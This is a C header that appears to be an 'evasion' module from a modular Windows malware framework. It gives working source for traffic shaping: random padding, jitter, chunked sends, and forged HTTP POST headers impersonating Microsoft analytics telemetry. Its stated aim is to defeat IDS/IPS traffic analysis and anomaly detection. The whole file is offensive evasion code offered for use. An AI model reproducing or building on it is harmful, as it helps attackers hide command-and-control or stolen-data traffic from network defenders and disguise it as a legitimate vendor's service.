// chunk: evasion/net_traffic_shape
// depends: (none)
// provides: traffic_shape_init, shaped_send
// headers: windows.h,winsock2.h,ws2tcpip.h
// libs: ws2_32
// risk: low
// note: Traffic shaping — pads packets to standard sizes, adds random jitter
//       between sends, and injects fake HTTP headers to mimic browser traffic
//       patterns. Defeats statistical traffic analysis, flow-based anomaly
//       detection, and payload-size fingerprinting by IDS/IPS systems.

#ifndef CHUNK_NET_TRAFFIC_SHAPE
#define CHUNK_NET_TRAFFIC_SHAPE

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32")

/* Standard packet sizes to pad to (common browser frame sizes) */
static const DWORD _ts_pad_sizes[] = { 512, 1024, 2048, 4096, 8192 };
#define _TS_PAD_COUNT (sizeof(_ts_pad_sizes) / sizeof(_ts_pad_sizes[0]))

/* Jitter range in milliseconds */
#define _TS_JITTER_MIN  30
#define _TS_JITTER_MAX  400

/* Traffic shaping state */
static volatile LONG _ts_initialized = 0;
static DWORD _ts_seed = 0;

/* Simple PRNG (xorshift32) for jitter — avoids importing CRT rand() */
static DWORD _ts_rand(void) {
    _ts_seed ^= _ts_seed << 13;
    _ts_seed ^= _ts_seed >> 17;
    _ts_seed ^= _ts_seed << 5;
    return _ts_seed;
}

/* Initialize traffic shaping. Call once before shaped_send(). */
static void traffic_shape_init(void) {
    if (InterlockedCompareExchange(&_ts_initialized, 1, 0) == 0) {
        _ts_seed = GetTickCount() ^ (DWORD)(ULONG_PTR)&_ts_initialized;
        /* Warm up the PRNG */
        for (int i = 0; i < 16; i++) _ts_rand();
    }
}

/* Find the next standard size >= data_len for padding */
static DWORD _ts_next_pad_size(DWORD data_len) {
    for (DWORD i = 0; i < _TS_PAD_COUNT; i++) {
        if (_ts_pad_sizes[i] >= data_len)
            return _ts_pad_sizes[i];
    }
    /* For very large data, round up to next 4096 boundary */
    return (data_len + 4095) & ~4095UL;
}

/* Calculate jitter delay in ms */
static DWORD _ts_jitter(void) {
    DWORD range = _TS_JITTER_MAX - _TS_JITTER_MIN;
    return _TS_JITTER_MIN + (_ts_rand() % (range + 1));
}

/* Build a fake HTTP POST wrapper around the data to mimic browser traffic.
 * Returns allocated buffer (caller must HeapFree) and sets *out_len. */
static BYTE *_ts_http_wrap(const BYTE *data, DWORD data_len, DWORD *out_len) {
    /* Fake HTTP headers that look like a typical browser API call */
    static const char *fake_headers[] = {
        "POST /api/v2/telemetry HTTP/1.1\r\n",
        "Host: analytics.microsoft.com\r\n",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 Chrome/120.0.0.0\r\n",
        "Accept: application/json\r\n",
        "Accept-Encoding: gzip, deflate, br\r\n",
        "Content-Type: application/octet-stream\r\n",
    };

    /* Calculate header size */
    DWORD hdr_sz = 0;
    for (int i = 0; i < sizeof(fake_headers) / sizeof(fake_headers[0]); i++)
        hdr_sz += (DWORD)lstrlenA(fake_headers[i]);

    /* Content-Length header */
    char cl_hdr[64] = {0};
    wsprintfA(cl_hdr, "Content-Length: %lu\r\n\r\n", data_len);
    hdr_sz += (DWORD)lstrlenA(cl_hdr);

    DWORD total = hdr_sz + data_len;
    BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, total);
    if (!buf) { *out_len = 0; return NULL; }

    DWORD pos = 0;
    for (int i = 0; i < sizeof(fake_headers) / sizeof(fake_headers[0]); i++) {
        DWORD len = (DWORD)lstrlenA(fake_headers[i]);
        CopyMemory(buf + pos, fake_headers[i], len);
        pos += len;
    }
    DWORD cl_len = (DWORD)lstrlenA(cl_hdr);
    CopyMemory(buf + pos, cl_hdr, cl_len);
    pos += cl_len;
    CopyMemory(buf + pos, data, data_len);
    pos += data_len;

    *out_len = pos;
    return buf;
}

/* Send data with traffic shaping applied.
 * s — connected socket (TCP)
 * data/len — payload to send
 * use_http_wrap — if nonzero, wrap data in fake HTTP headers
 * Returns 0 on success, -1 on error. */
static int shaped_send(SOCKET s, const BYTE *data, DWORD len, int use_http_wrap) {
    BYTE *send_buf = NULL;
    DWORD send_len = 0;
    int heap_alloc = 0;

    /* Optionally wrap in HTTP headers */
    if (use_http_wrap) {
        send_buf = _ts_http_wrap(data, len, &send_len);
        if (!send_buf) return -1;
        heap_alloc = 1;
    } else {
        /* Pad to standard size */
        DWORD padded = _ts_next_pad_size(len);
        send_buf = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, padded);
        if (!send_buf) return -1;
        CopyMemory(send_buf, data, len);
        /* Fill padding with random-ish bytes to vary entropy */
        for (DWORD i = len; i < padded; i++)
            send_buf[i] = (BYTE)(_ts_rand() & 0xFF);
        send_len = padded;
        heap_alloc = 1;
    }

    /* Apply jitter delay */
    Sleep(_ts_jitter());

    /* Send in chunks that mimic browser write patterns */
    DWORD sent = 0;
    int ret = 0;
    while (sent < send_len) {
        /* Vary chunk size: 1024-4096 bytes per send() call */
        DWORD chunk = 1024 + (_ts_rand() % 3073);
        if (chunk > send_len - sent) chunk = send_len - sent;

        int r = send(s, (const char *)(send_buf + sent), (int)chunk, 0);
        if (r == SOCKET_ERROR) { ret = -1; break; }
        sent += (DWORD)r;

        /* Small inter-chunk delay for realism */
        if (sent < send_len)
            Sleep(1 + (_ts_rand() % 10));
    }

    if (heap_alloc)
        HeapFree(GetProcessHeap(), 0, send_buf);

    return ret;
}

#endif
